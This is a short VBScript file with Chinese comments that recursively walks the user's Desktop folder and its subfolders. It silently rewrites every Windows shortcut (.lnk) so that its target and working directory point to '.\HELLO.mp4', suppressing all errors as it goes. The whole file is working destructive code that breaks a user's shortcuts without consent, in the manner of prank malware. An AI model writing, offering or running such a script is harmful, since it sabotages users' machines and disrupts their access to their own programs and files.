On Error Resume Next 

dim WSHShell, desktop, pathstring, objFSO
set objFSO=CreateObject("Scripting.FileSystemObject")
Set WSHshell = CreateObject("WScript.Shell")
desktop = WSHShell.SpecialFolders("Desktop")
pathstring = objFSO.GetAbsolutePathName(desktop)

strFolderPath=pathstring '快捷方式的路径 
strReplace=".\HELLO.mp4" '替换成的字符串 

Set wshShell = CreateObject("Shell.Application")  
Set wshFSO = CreateObject("Scripting.FileSystemObject") 

AlterSubFolders wshFSO.GetFolder(strFolderPath) 

Sub AlterSubFolders(Folder) 

Set npFolder = wshShell.Namespace (Folder.Path) 
Set allFiles=Folder.Files 

For Each lnkFile In allFiles 

If InStrRev(UCase(lnkFile.Name), ".LNK") <> 0 Then '扩展名是否快捷方式 
  Set lnkItem = npFolder.ParseName(lnkFile.Name)  
  Set lnkItemLink = lnkItem.GetLink  
  lnkItemLink.Path = Replace("""" & lnkItemLink.Path & """",lnkItemLink.Path,strReplace) 
  lnkItemLink.WorkingDirectory = Replace("""" & lnkItemLink.WorkingDirectory & """",lnkItemLink.WorkingDirectory,strReplace) 
  lnkItemLink.Save() 
End If 
Next 

For Each Subfolder in Folder.SubFolders 
  Set npFolder = wshShell.Namespace (Subfolder.Path) 
  Set objFolder = wshFSO.GetFolder (Subfolder.Path) 
  Set allFiles = objFolder.Files 

  For Each lnkFile in allFiles  
    If InStrRev(UCase(lnkFile.Name), ".LNK") <> 0 Then '扩展名是否快捷方式 
      Set lnkItem = npFolder.ParseName(lnkFile.Name) 
      Set lnkItemLink = lnkItem.GetLink 
      lnkItemLink.Path = Replace("""" & lnkItemLink.Path & """",lnkItemLink.Path,strReplace) 
      lnkItemLink.WorkingDirectory = Replace("""" & lnkItemLink.WorkingDirectory & """",lnkItemLink.WorkingDirectory,strReplace) 
      lnkItemLink.Save() 
    End If 
  Next 
  AlterSubFolders Subfolder 
Next 

End Sub